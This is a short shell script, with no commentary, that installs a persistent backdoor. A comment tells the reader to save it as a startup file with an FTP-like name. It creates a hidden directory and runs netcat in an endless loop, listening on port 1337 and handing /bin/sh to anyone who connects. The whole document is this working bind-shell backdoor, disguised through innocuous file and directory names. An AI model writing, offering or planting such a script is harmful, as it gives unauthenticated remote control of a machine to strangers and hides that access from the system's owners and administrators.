#!/bin/sh
#save in /etc/rc.d/rc.ftpp
mkdir -p /etc/ftp/.data
while true ; do
  cd /etc/ftp/.data | nc -l -p 1337 -e /bin/sh
done
